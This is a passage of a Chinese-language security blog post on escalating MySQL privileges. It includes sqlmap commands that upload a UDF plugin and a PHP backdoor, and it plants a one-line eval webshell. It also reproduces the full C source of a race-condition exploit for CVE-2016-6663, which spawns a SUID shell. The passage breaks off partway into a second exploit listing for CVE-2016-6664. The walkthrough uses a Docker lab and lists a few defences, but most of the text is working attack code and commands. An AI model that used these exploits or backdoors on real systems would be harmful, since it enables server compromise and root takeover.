-<h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>使用sqlmap自动化上传插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --file-write=/lib_mysqludf_sys.so  --file-dest=/usr/lib/mysql/plugin/</span><br></pre></td></tr></table></figure></p>
-<p>激活sys_exec函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --sql-shell</span><br></pre></td></tr></table></figure></p>
-<p>利用sqlmap上传后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --file-write=c:/phpspy.php --file-dest=/var/www/spy.php</span><br></pre></td></tr></table></figure></p>
-<h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul>
-<li>最根本的防御是过滤sql注入</li>
-<li>限制mysql的写入权限</li>
-</ul>
-<h2 id="0x03-CVE-2016-6663和CVE-2016-6664"><a href="#0x03-CVE-2016-6663和CVE-2016-6664" class="headerlink" title="0x03 CVE-2016-6663和CVE-2016-6664"></a>0x03 CVE-2016-6663和CVE-2016-6664</h2><p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p>
-<h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
-<h3 id="CVE-2016-6664"><a href="#CVE-2016-6664" class="headerlink" title="CVE-2016-6664"></a>CVE-2016-6664</h3><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p>
-<p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p>
-<p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p>
-<h3 id="CVE-2016-6663利用条件"><a href="#CVE-2016-6663利用条件" class="headerlink" title="CVE-2016-6663利用条件"></a>CVE-2016-6663利用条件</h3><ul>
-<li>1.已经getshell，获得www-data权限</li>
-<li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li>
-<li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li>
-<li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
-</ul>
-<h3 id="CVE-2016-6664利用条件"><a href="#CVE-2016-6664利用条件" class="headerlink" title="CVE-2016-6664利用条件"></a>CVE-2016-6664利用条件</h3><ul>
-<li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li>
-<li>2.需要在mysql权限下运行才能利用</li>
-<li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
-</ul>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开docker，拉取镜像tutum/lamp。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv02.png?raw=true" alt=""></p>
-<p>运行docker并连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P tutum/lamp</span><br><span class="line">docker ps</span><br><span class="line">docker exec -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv03.png?raw=true" alt=""></p>
-<p>更新apt，并安装wget，gcc，libmysqlclient-dev<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install -y wget gcc libmysqlclient-dev</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv04.png?raw=true" alt=""></p>
-<p>这里假设我们已经拿到一个www-data这种低权限的webshell和一个拥有create,drop,insert,select权限的数据库账号，密码。</p>
-<p>所以我们手动写入webshell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/webshell.php</span><br></pre></td></tr></table></figure></p>
-<p>然后将&lt;?php @eval($_POST[123456]);?&gt;写入保存，并赋予我们任何用户在web路径的可读可写可执行权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure></p>
-<p>然后我们进入数据库，添加一个对test库有create,drop,insert,select权限的test用户，密码为123456<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">create database test;</span><br><span class="line">CREATE USER &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos;; </span><br><span class="line">grant create,drop,insert,select on test.* to &apos;test&apos;@&apos;%&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv05.png?raw=true" alt=""></p>
-<p>配置好之后，我们将apache2和mysql服务重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service restart apache2</span><br><span class="line">service restart mysql</span><br></pre></td></tr></table></figure></p>
-<p>然后我们退出当前连接，将配置好的容器提交为一个新容器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit dfdd42e8e688 leticia0/lamp</span><br></pre></td></tr></table></figure></p>
-<p>然后以将新容器的80端口映射到8080端口，3306映射到3306端口的方式运行容器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 3306:3306 leticia0/lamp</span><br></pre></td></tr></table></figure></p>
-<p>通过本机访问docker的web应用，看到如下界面说明环境搭建成功。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv06.png?raw=true" alt=""></p>
-<h3 id="www-data权限提升为mysql权限"><a href="#www-data权限提升为mysql权限" class="headerlink" title="www-data权限提升为mysql权限"></a>www-data权限提升为mysql权限</h3><p>接下来我们用菜刀连接刚才的webshell</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv07.png?raw=true" alt=""></p>
-<p>使用whoami可以看到当前权限是www-data</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv08.png?raw=true" alt=""></p>
-<p>运行ls -ld，可以发现我们目前的www-data只有对html目录是可读可写可执行的，所以我们需要将exp写入html目录</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv09.png?raw=true" alt=""></p>
-<p>CVE-2016-6663 exp网址： <a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></p>
-<p>CVE=2016-6663 exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;grp.h&gt;</span><br><span class="line">#include &lt;mysql.h&gt;</span><br><span class="line">#include &lt;pwd.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/inotify.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define EXP_PATH          &quot;/tmp/mysql_privesc_exploit&quot;</span><br><span class="line">#define EXP_DIRN          &quot;mysql_privesc_exploit&quot;</span><br><span class="line">#define MYSQL_TAB_FILE    EXP_PATH &quot;/exploit_table.MYD&quot;</span><br><span class="line">#define MYSQL_TEMP_FILE   EXP_PATH &quot;/exploit_table.TMD&quot;</span><br><span class="line"></span><br><span class="line">#define SUID_SHELL   	  EXP_PATH &quot;/mysql_suid_shell.MYD&quot;</span><br><span class="line"></span><br><span class="line">#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary</span><br><span class="line"></span><br><span class="line">MYSQL *conn;		  // DB handles</span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line">unsigned long cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void intro() &#123;</span><br><span class="line"></span><br><span class="line">printf( </span><br><span class="line">        &quot;\033[94m\n&quot;</span><br><span class="line">        &quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span><br><span class="line">        &quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span><br><span class="line">        &quot;CVE-2016-6663 / CVE-2016-5616\n\n&quot;</span><br><span class="line">        &quot;For testing purposes only. Do no harm.\n\n&quot;</span><br><span class="line">	&quot;Discovered/Coded by:\n\n&quot;</span><br><span class="line">	&quot;Dawid Golunski \n&quot;</span><br><span class="line">	&quot;http://legalhackers.com&quot;</span><br><span class="line">        &quot;\033[0m\n\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void usage(char *argv0) &#123;</span><br><span class="line">    intro();</span><br><span class="line">    printf(&quot;Usage:\n\n%s user pass db_host database\n\n&quot;, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mysql_cmd(char *sql_cmd, int silent) &#123;</span><br><span class="line">    </span><br><span class="line">    if (!silent) &#123;</span><br><span class="line">	    printf(&quot;%s \n&quot;, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mysql_query(conn, sql_cmd)) &#123;</span><br><span class="line">        fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    if (res&gt;0) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int randomnum = 0;</span><br><span class="line">    int io_notified = 0;</span><br><span class="line">    int myd_handle;</span><br><span class="line">    int wpid;</span><br><span class="line">    int is_shell_suid=0;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int status;</span><br><span class="line">    struct stat st;</span><br><span class="line">    /* io notify */</span><br><span class="line">    int fd;</span><br><span class="line">    int ret;</span><br><span class="line">    char buf[4096] __attribute__((aligned(8)));</span><br><span class="line">    int num_read;</span><br><span class="line">    struct inotify_event *event;</span><br><span class="line">    /* credentials */</span><br><span class="line">    char *user     = argv[1];</span><br><span class="line">    char *password = argv[2];</span><br><span class="line">    char *db_host  = argv[3];</span><br><span class="line">    char *database = argv[4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Disable buffering of stdout</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">    // Get the params</span><br><span class="line">    if (argc!=5) &#123;</span><br><span class="line">	usage(argv[0]);</span><br><span class="line">	exit(1);</span><br><span class="line">    &#125; </span><br><span class="line">    intro();</span><br><span class="line">    // Show initial privileges</span><br><span class="line">    printf(&quot;\n[+] Starting the exploit as: \n&quot;);</span><br><span class="line">    system(&quot;id&quot;);</span><br><span class="line"></span><br><span class="line">    // Connect to the database server with provided credentials</span><br><span class="line">    printf(&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;, database, user, db_host);</span><br><span class="line">    conn = mysql_init(NULL);</span><br><span class="line">    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) &#123;</span><br><span class="line">        fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prepare tmp dir</span><br><span class="line">    printf(&quot;\n[+] Creating exploit temp directory %s\n&quot;, &quot;/tmp/&quot; EXP_DIRN);</span><br><span class="line">    umask(000);</span><br><span class="line">    system(&quot;rm -rf /tmp/&quot; EXP_DIRN &quot; &amp;&amp; mkdir /tmp/&quot; EXP_DIRN);</span><br><span class="line">    system(&quot;chmod g+s /tmp/&quot; EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    // Prepare exploit tables :)</span><br><span class="line">    printf(&quot;\n[+] Creating mysql tables \n\n&quot;);</span><br><span class="line">    mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 0);</span><br><span class="line"></span><br><span class="line">    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br><span class="line">    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br><span class="line">    printf(&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;);</span><br><span class="line">    system(&quot;cp /bin/bash &quot; SUID_SHELL);</span><br><span class="line">    system(&quot;ls -l &quot; SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    // Use inotify to get the timing right</span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;failed to inotify_init\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n[+] Entering the race loop... Hang in there...\n&quot;);</span><br><span class="line"></span><br><span class="line">    while ( is_shell_suid != 1 ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">	if ( (cnt % 100) == 0 ) &#123;</span><br><span class="line">	 	printf(&quot;-&gt;&quot;);</span><br><span class="line">	 	//fflush(stdout);	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        /* Create empty file , remove if already exists */</span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   	mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 1);</span><br><span class="line">	mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 1);</span><br><span class="line"></span><br><span class="line">	/* random num if needed */</span><br><span class="line">        srand ( time(NULL) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br><span class="line">        pid = fork();</span><br><span class="line">        if (pid &lt; 0) &#123;</span><br><span class="line">            fprintf(stderr, &quot;Fork failed :(\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* Child process - executes REPAIR TABLE  SQL statement */</span><br><span class="line">        if (pid == 0) &#123;</span><br><span class="line">            usleep(500);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">	    mysql_cmd(&quot;REPAIR TABLE exploit_table EXTENDED&quot;, 1);</span><br><span class="line">            // child stops here</span><br><span class="line">            exit(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br><span class="line">        if (pid &gt; 0 ) &#123;</span><br><span class="line">            io_notified = 0;</span><br><span class="line"></span><br><span class="line">            while (1) &#123;</span><br><span class="line">                int processed = 0;</span><br><span class="line">                ret = read(fd, buf, sizeof(buf));</span><br><span class="line">                if (ret &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    if (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        if (!strcmp(event-&gt;name, &quot;exploit_table.TMD&quot;)) &#123;</span><br><span class="line">                            //usleep(randomnum);</span><br><span class="line"></span><br><span class="line">			    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br><span class="line">			    unlink(MYSQL_TAB_FILE);</span><br><span class="line">			    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);</span><br><span class="line">			    close(myd_handle);</span><br><span class="line">			    chmod(MYSQL_TAB_FILE, 04777);</span><br><span class="line"></span><br><span class="line">			    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=1;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += sizeof(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                if (io_notified) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	// Check if SUID bit was set at the end of this attempt</span><br><span class="line">        if ( lstat(SUID_SHELL, &amp;st) == 0 ) &#123;</span><br><span class="line">	    if (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">		is_shell_suid = 1;</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;, cnt);</span><br><span class="line">    system(&quot;ls -l &quot; SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;);</span><br><span class="line">    system(SUID_SHELL &quot; -p -i &quot;);</span><br><span class="line">    //system(SUID_SHELL &quot; -p -c &apos;/bin/bash -i -p&apos;&quot;);</span><br><span class="line"></span><br><span class="line">    /* close MySQL connection and exit */</span><br><span class="line">    printf(&quot;\n[+] Job done. Exiting\n\n&quot;);</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>我们通过菜刀写入exp：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv10.png?raw=true" alt=""></p>
-<p>菜刀这里执行总失败，我通过写入另一个shell反弹之后编译并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br><span class="line">./mysql-privesc-race test 123456 localhost test</span><br></pre></td></tr></table></figure></p>
-<p>成功提权</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv11.png?raw=true" alt=""></p>
-<h3 id="mysql提升为root权限"><a href="#mysql提升为root权限" class="headerlink" title="mysql提升为root权限"></a>mysql提升为root权限</h3><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mysql/conf.d/mysqld_safe_syslog.cnf</span><br></pre></td></tr></table></figure></p>
-<p>删除掉syslog，然后重启mysql，查看是否更改成功，如果更改成功，下面命令产生空结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r syslog /etc/mysqlsqld_safe_syslog.cnf</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv12.png?raw=true" alt=""></p>
-<p>CVE-2016-6664 exp网址：<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p>
-<p>CVE-2016-6664 exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 